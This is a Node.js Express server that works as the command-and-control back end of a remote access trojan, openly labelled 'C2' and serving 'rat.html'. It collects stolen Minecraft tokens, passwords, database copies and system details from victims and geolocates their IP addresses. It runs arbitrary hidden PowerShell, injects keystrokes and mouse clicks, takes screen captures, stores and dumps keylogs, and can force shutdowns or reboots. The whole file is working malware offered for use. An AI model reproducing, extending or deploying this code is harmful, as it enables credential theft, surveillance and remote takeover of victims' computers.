const express = require('express');
const cors = require('cors');
const screenshot = require('screenshot-desktop');
const { execSync } = require('child_process');
const fs = require('fs');
const https = require('https');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const sessions = new Map();
const targets = new Map();

async function getScreenshot() {
  try {
    const img = await screenshot({ format: 'png' });
    return img;
  } catch (e) {
    return Buffer.alloc(0);
  }
}

function execPowershell(cmd) {
  try {
    const result = execSync(`powershell -NoProfile -WindowStyle Hidden -Command "${cmd.replace(/"/g, '\\"')}"`, { encoding: 'utf8', maxBuffer: 10 * 1024 * 1024 });
    return result;
  } catch (e) {
    return `ERROR: ${e.message}`;
  }
}

async function geolocate(ip) {
  return new Promise((resolve) => {
    const url = `https://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,org`;
    https.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve({ error: 'parse failed' });
        }
      });
    }).on('error', () => resolve({ error: 'lookup failed' }));
  });
}

app.post('/instant/harvest', (req, res) => {
  const data = req.body;
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
  const cleanIp = clientIp.split(',')[0].trim();

  const targetId = cleanIp + '_' + Date.now();
  if (!targets.has(targetId)) {
    targets.set(targetId, {
      created: Date.now(),
      ip: cleanIp,
      minecraft_tokens: [],
      passwords: [],
      databases_copied: false,
      sysinfo: {},
      session_id: null
    });
  }

  const target = targets.get(targetId);

  if (data.minecraft) {
    target.minecraft_tokens = data.minecraft.split(',');
  }
  if (data.passwords) {
    target.passwords = data.passwords.split('|');
  }
  if (data.databases) {
    target.databases_copied = true;
  }
  if (data.sysinfo) {
    try {
      target.sysinfo = JSON.parse(data.sysinfo);
    } catch (e) {
      target.sysinfo = data.sysinfo;
    }
  }

  res.json({ status: 'harvested', target_id: targetId });
});

app.get('/init', async (req, res) => {
  const sid = req.query.sid || 'sess_' + Math.random().toString(36).substr(2, 9);
  const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
  const cleanIp = clientIp.split(',')[0].trim();
  
  const geo = await geolocate(cleanIp);
  
  let harvestedData = null;
  for (const [targetId, target] of targets.entries()) {
    if (target.ip === cleanIp && (Date.now() - target.created) < 10000) {
      harvestedData = target;
      target.session_id = sid;
      break;
    }
  }

  sessions.set(sid, {
    created: Date.now(),
    cmds: [],
    hostname: harvestedData?.sysinfo?.hostname || 'unknown',
    clientIp: cleanIp,
    geo: geo,
    realIp: null,
    hidden: false,
    credentials: harvestedData ? [{
      type: 'instant_harvest',
      minecraft_tokens: harvestedData.minecraft_tokens,
      passwords: harvestedData.passwords,
      databases_copied: harvestedData.databases_copied,
      timestamp: harvestedData.created
    }] : [],
    keylog_buffer: []
  });
  
  res.json({
    session: sid,
    status: 'ok',
    hostname: sessions.get(sid).hostname,
    detected_ip: cleanIp,
    geo: geo,
    credentials_already_harvested: harvestedData ? true : false,
    minecraft_tokens: harvestedData?.minecraft_tokens?.length || 0,
    passwords_captured: harvestedData?.passwords?.length || 0
  });
});

app.get('/screen', async (req, res) => {
  const sid = req.query.sid;
  if (!sessions.has(sid)) {
    return res.status(404).send(Buffer.alloc(0));
  }
  const img = await getScreenshot();
  res.type('image/png').send(img);
});

app.post('/cmd', (req, res) => {
  const { session, cmd, data } = req.body;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  const sess = sessions.get(session);
  sess.cmds.push({ cmd, data, ts: Date.now() });

  if (cmd === 'key_down') {
    const ps = `[System.Windows.Forms.SendKeys]::SendWait('${data.key.replace(/'/g, "''")}')`;
    execPowershell(ps);
  } else if (cmd === 'mouse_click') {
    const ps = `[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${data.x}, ${data.y}); Start-Sleep -Milliseconds 50; [System.Windows.Forms.SendKeys]::SendWait('{LBUTTON}')`;
    execPowershell(ps);
  }

  res.json({ status: 'cmd_queued' });
});

app.post('/shell', (req, res) => {
  const { session, cmd } = req.body;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  const output = execPowershell(cmd);
  res.json({ output, status: 'ok' });
});

app.post('/shutdown', (req, res) => {
  const { session } = req.body;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  execPowershell(`shutdown /s /t 0`);
  res.json({ status: 'shutdown_initiated' });
});

app.post('/reboot', (req, res) => {
  const { session } = req.body;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  execPowershell(`shutdown /r /t 0`);
  res.json({ status: 'reboot_initiated' });
});

app.post('/keylog', (req, res) => {
  const { session, keys } = req.body;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  sessions.get(session).keylog_buffer.push(...keys);
  res.json({ status: 'logged' });
});

app.get('/keylog', (req, res) => {
  const { session } = req.query;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  const logs = sessions.get(session).keylog_buffer.join('');
  res.json({ keylog: logs, count: logs.length });
});

app.get('/dump/credentials', (req, res) => {
  const { session } = req.query;
  if (!sessions.has(session)) {
    return res.status(404).json({ error: 'session not found' });
  }

  const creds = sessions.get(session).credentials;
  res.json({ credentials: creds, total: creds.length });
});

app.get('/sessions', (req, res) => {
  const list = Array.from(sessions.keys()).map(sid => {
    const s = sessions.get(sid);
    return {
      sid,
      hostname: s.hostname,
      detected_ip: s.clientIp,
      real_ip: s.realIp,
      geo: s.geo,
      minecraft_tokens: s.credentials.length > 0 ? s.credentials[0].minecraft_tokens?.length || 0 : 0,
      passwords_captured: s.credentials.length > 0 ? s.credentials[0].passwords?.length || 0 : 0,
      databases_copied: s.credentials.length > 0 ? s.credentials[0].databases_copied : false,
      created: s.created,
      cmds: s.cmds.length
    };
  });
  res.json(list);
});

app.get('/rat.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'rat.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 live on ${PORT}`));
